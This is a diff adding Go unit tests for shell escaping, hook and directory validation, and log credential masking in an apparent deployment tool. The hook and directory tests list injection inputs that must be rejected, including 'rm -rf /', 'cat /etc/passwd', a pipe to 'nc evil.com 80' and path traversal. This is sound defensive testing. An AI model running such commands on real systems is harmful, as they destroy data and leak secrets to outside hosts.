@@ -279,6 +279,179 @@ func TestValidateDockerCommand(t *testing.T) {
 	}
 }
 
+func TestShellEscape(t *testing.T) {
+	tests := []struct {
+		name     string
+		input    string
+		expected string
+	}{
+		{"empty string", "", "''"},
+		{"simple string", "hello", "'hello'"},
+		{"with spaces", "hello world", "'hello world'"},
+		{"with single quotes", "it's", "'it'\\''s'"},
+		{"with double quotes", `say "hello"`, `'say "hello"'`},
+		{"with backticks", "echo `id`", "'echo `id`'"},
+		{"with dollar paren", "echo $(id)", "'echo $(id)'"},
+		{"with dollar brace", "echo ${PATH}", "'echo ${PATH}'"},
+		{"with newline", "line1\nline2", "'line1\nline2'"},
+		{"with semicolon", "cmd1; cmd2", "'cmd1; cmd2'"},
+		{"DATABASE_URL with special chars", "postgresql://user:p@ss'w0rd@host:5432/db?version=16", "'postgresql://user:p@ss'\\''w0rd@host:5432/db?version=16'"},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := ShellEscape(tt.input)
+			if got != tt.expected {
+				t.Errorf("ShellEscape(%q) = %q, want %q", tt.input, got, tt.expected)
+			}
+		})
+	}
+}
+
+func TestValidateHook(t *testing.T) {
+	tests := []struct {
+		name    string
+		input   string
+		wantErr bool
+	}{
+		{"valid php console", "php bin/console cache:clear", false},
+		{"valid composer", "composer install --no-dev", false},
+		{"valid migration", "php bin/console doctrine:migrations:migrate --no-interaction", false},
+		{"empty", "", true},
+		{"semicolon injection", "php bin/console; rm -rf /", true},
+		{"and injection", "php bin/console && cat /etc/passwd", true},
+		{"pipe injection", "php bin/console | nc evil.com 80", true},
+		{"backtick injection", "php bin/console `id`", true},
+		{"subshell injection", "php bin/console $(whoami)", true},
+		{"redirect injection", "php bin/console > /tmp/evil", true},
+		{"newline injection", "php bin/console\nrm -rf /", true},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := ValidateHook(tt.input)
+			if (err != nil) != tt.wantErr {
+				t.Errorf("ValidateHook(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
+			}
+		})
+	}
+}
+
+func TestValidateSharedDir(t *testing.T) {
+	tests := []struct {
+		name    string
+		input   string
+		wantErr bool
+	}{
+		{"valid simple", "var", false},
+		{"valid nested", "var/log", false},
+		{"valid with dots", "var/log.1", false},
+		{"valid with hyphens", "my-dir", false},
+		{"valid with underscores", "my_dir", false},
+		{"valid deep", "var/log/app", false},
+		{"empty", "", true},
+		{"absolute path", "/var/log", true},
+		{"parent traversal", "../etc", true},
+		{"hidden traversal", "var/../../etc", true},
+		{"with spaces", "var log", true},
+		{"with semicolon", "var;id", true},
+		{"with backtick", "var`id`", true},
+		{"with shell expansion", "var$(id)", true},
+		{"double slash", "var//log", true},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := ValidateSharedDir(tt.input)
+			if (err != nil) != tt.wantErr {
+				t.Errorf("ValidateSharedDir(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
+			}
+		})
+	}
+}
+
+func TestGenerateHeredocDelimiter(t *testing.T) {
+	t.Run("non-empty", func(t *testing.T) {
+		delim := GenerateHeredocDelimiter("ENVEOF")
+		if delim == "" {
+			t.Error("GenerateHeredocDelimiter returned empty string")
+		}
+	})
+
+	t.Run("has prefix", func(t *testing.T) {
+		delim := GenerateHeredocDelimiter("ENVEOF")
+		if !strings.HasPrefix(delim, "ENVEOF_") {
+			t.Errorf("expected prefix 'ENVEOF_', got %q", delim)
+		}
+	})
+
+	t.Run("unique between calls", func(t *testing.T) {
+		delim1 := GenerateHeredocDelimiter("TEST")
+		delim2 := GenerateHeredocDelimiter("TEST")
+		if delim1 == delim2 {
+			t.Error("GenerateHeredocDelimiter returned identical values on consecutive calls")
+		}
+	})
+}
+
+func TestSanitizeCommandForLog(t *testing.T) {
+	tests := []struct {
+		name     string
+		input    string
+		contains string // substring that should NOT be present
+		masked   bool   // true if the output should contain ****
+	}{
+		{
+			"masks DATABASE_URL",
+			"-e DATABASE_URL='postgresql://user:secret@host/db'",
+			"secret",
+			true,
+		},
+		{
+			"masks POSTGRES_PASSWORD",
+			"-e POSTGRES_PASSWORD=mysecretpass",
+			"mysecretpass",
+			true,
+		},
+		{
+			"masks MYSQL_PASSWORD",
+			"-e MYSQL_PASSWORD=mysqlpass123",
+			"mysqlpass123",
+			true,
+		},
+		{
+			"masks MYSQL_ROOT_PASSWORD",
+			"-e MYSQL_ROOT_PASSWORD=rootpass",
+			"rootpass",
+			true,
+		},
+		{
+			"masks -p<password>",
+			"mysqladmin ping -uadmin -psecretpass --silent",
+			"secretpass",
+			true,
+		},
+		{
+			"no masking for safe commands",
+			"docker exec myapp php bin/console cache:clear",
+			"",
+			false,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := SanitizeCommandForLog(tt.input)
+			if tt.masked && !strings.Contains(result, "****") {
+				t.Errorf("expected masked output to contain '****', got %q", result)
+			}
+			if tt.contains != "" && strings.Contains(result, tt.contains) {
+				t.Errorf("sanitized output should not contain %q, got %q", tt.contains, result)
+			}
+		})
+	}
+}
+
 // Test injection attempts that could bypass validation
 func TestInjectionAttempts(t *testing.T) {
 	injectionPayloads := []string{
